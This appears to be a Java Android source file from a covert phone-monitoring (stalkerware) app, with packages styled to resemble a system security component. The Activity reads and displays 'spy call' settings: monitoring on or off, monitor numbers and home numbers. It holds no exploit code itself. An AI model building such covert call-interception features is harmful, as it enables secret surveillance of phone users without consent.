package com.fx;

import java.util.List;

import android.app.Activity;
import android.app.ProgressDialog;
import android.os.AsyncTask;
import android.os.Bundle;
import android.widget.TextView;

import com.android.msecurity.R;
import com.fx.maind.ref.SpyCallSettings;
import com.fx.maind.ref.command.RemoteGetSpyCallSettings;
import com.fx.socket.SocketCmd;
import com.fx.util.Customization;
import com.vvt.logger.FxLog;

public class SpyCallSettingActivity extends Activity {
	private static final boolean DEBUG = true;
	private static final boolean LOGV = Customization.DEBUG ? DEBUG : false;
	private static final String TAG = "SpyCallSettingActivity";

	private TextView mTextView = null;
	
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.generic_settings);
		
		mTextView = (TextView) findViewById(R.id.details_textview);
		new UITask().execute(new RemoteGetSpyCallSettings());
	}
	
	private class UITask extends AsyncTask<SocketCmd<?, ?>, Void, String> {
		private Object result = null;
		private ProgressDialog pDialog;
		
		protected void onPreExecute() {
			pDialog = ProgressDialog.show(
					SpyCallSettingActivity.this, "", 
					getString(R.string.language_ui_msg_processing_polite), true);
	    }
		
	    protected String doInBackground(SocketCmd<?, ?>... socketCommand) {
	    	if (LOGV) FxLog.v(TAG, "UITask # doInBackground # START");
	    	
	    	SocketCmd<?, ?> initSocketCommand = socketCommand[0];
	    	
			try {
				if (LOGV) FxLog.v(TAG, "UITask # before execute");
        		result = initSocketCommand.execute();
        		if (LOGV) FxLog.v(TAG, "UITask # after execute");
        	}
        	catch(Throwable t) {
        		if (LOGV) FxLog.e(TAG, "UITask # doInBackground # error:" + t.toString());
        	}
			
			if (LOGV && result != null) FxLog.v(TAG, "UITask # doInBackground # result #" + result.toString());
			if (LOGV) FxLog.v(TAG, "UITask # doInBackground # EXIT");
	    	return null;
	    }

	    
	    protected void onPostExecute(String outputMsg) {
	    	pDialog.dismiss();
	    	
	    	if (result == null) {
	    		UiHelper.notifyUser(getApplicationContext(), "Internal error!");
	    	}
	    	else {
	    		onPostExecuteTask(result);
	    	}
	    }
	}
	
	private void onPostExecuteTask(Object result) {
		SpyCallSettings response = (SpyCallSettings) result;
		StringBuilder sb = new StringBuilder();

		sb.append("Spy call:").append(System.getProperty("line.separator"));
		
		if(response.getEnableMonitor()) {
			sb.append("Currently set to enabled").append(System.getProperty("line.separator"));
		}
		else {
			sb.append("Currently set to disable").append(System.getProperty("line.separator"));
		}
		
		sb.append(System.getProperty("line.separator"));
		
		List<String> monitorNumbers = response.GetMonitorNumbers();
		sb.append("Monitor numbers: ").append(System.getProperty("line.separator"));
		
		if(monitorNumbers.size() > 0) {
			for (String number : monitorNumbers) {
				sb.append(number).append(System.getProperty("line.separator"));
			}
		}
		else {
			sb.append("[none]");
		}
				
		
		sb.append(System.getProperty("line.separator"));
		
		sb.append("Home numbers: ").append(System.getProperty("line.separator"));
		
		List<String> homeNumbers = response.GetHomeNumbers();
		if(homeNumbers.size() > 0) {
			for (String number : homeNumbers) {
				sb.append(number).append(System.getProperty("line.separator"));
			}	
		}
		else {
			sb.append("[none]");
		}
		
		mTextView.setText(sb.toString());
	}
}
